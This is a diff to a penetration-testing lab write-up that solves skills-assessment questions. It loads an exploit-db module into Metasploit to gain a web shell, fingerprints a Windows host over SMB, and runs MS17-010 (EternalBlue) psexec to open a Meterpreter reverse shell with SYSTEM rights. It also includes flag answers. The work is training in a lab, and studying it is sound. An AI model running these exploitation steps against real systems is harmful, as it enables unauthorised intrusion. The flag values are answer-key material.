@@ -380,7 +380,75 @@ For this we use metasploit as this exploit is already written to be added to msf
 
 ```shell
 
-msfconsole
-msf> 
-/usr/share/exploitdb/exploits/php/webapps/50064.rb
+sudo cp /usr/var/searchspoit/php/webapps/50064.rb /usr/share/metasploit-framework/modules/exploits/web/50064.rb
 
+msfconsole
+
+msf> reload_all
+msf> search 50064.rb
+msf> use 0
+msf> ... set all options with username and pw from creds file...
+# It is important to set the vhost to blog.inlanefreight.local
+
+```
+
+Now we have a shell:
+![alt text](../assets/images/1785869954849-image.png)
+
+Moving into the right place and printing out the flag gives us the answer:
+
+```shell
+B1nD_Shells_r_cool
+```
+
+### 6. Question
+*What is the hostname of Host-3?*
+
+To figure this out we try an nmap scan:
+
+```shell
+# part of the result:
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: SHELLS-WINBLUE
+|   NetBIOS computer name: SHELLS-WINBLUE\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2026-08-04T12:08:00-07:00
+| nbstat: NetBIOS name: SHELLS-WINBLUE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:8a:81:6e (VMware)
+| Names:
+|   SHELLS-WINBLUE<00>   Flags: <unique><active>
+|   WORKGROUP<00>        Flags: <group><active>
+|   SHELLS-WINBLUE<20>   Flags: <unique><active>
+```
+
+Provides us the host name "SHELLS-WINBLUE" (...eternalblue?...)
+
+### 7. Question
+*Exploit and... flag*
+
+```shell
+# running ms17_010_psexec against the target with setting lhost and rhost
+
+msf6 exploit(windows/smb/ms17_010_psexec) > set lhost 172.16.1.5
+lhost => 172.16.1.5
+msf6 exploit(windows/smb/ms17_010_psexec) > set rhost 172.16.1.13
+rhost => 172.16.1.13
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+
+[*] Started reverse TCP handler on 172.16.1.5:4444 
+[*] 172.16.1.13:445 - Target OS: Windows Server 2016 Standard 14393
+[*] 172.16.1.13:445 - Built a write-what-where primitive...
+[+] 172.16.1.13:445 - Overwrite complete... SYSTEM session obtained!
+[*] 172.16.1.13:445 - Selecting PowerShell target
+[*] 172.16.1.13:445 - Executing the payload...
+[+] 172.16.1.13:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (175174 bytes) to 172.16.1.13
+[*] Meterpreter session 1 opened (172.16.1.5:4444 -> 172.16.1.13:49671) at 2026-08-04 15:45:28 -0400
+
+
+cat C:/Users/Administrator/Desktop/Skills-flag.txt
+
+
+```
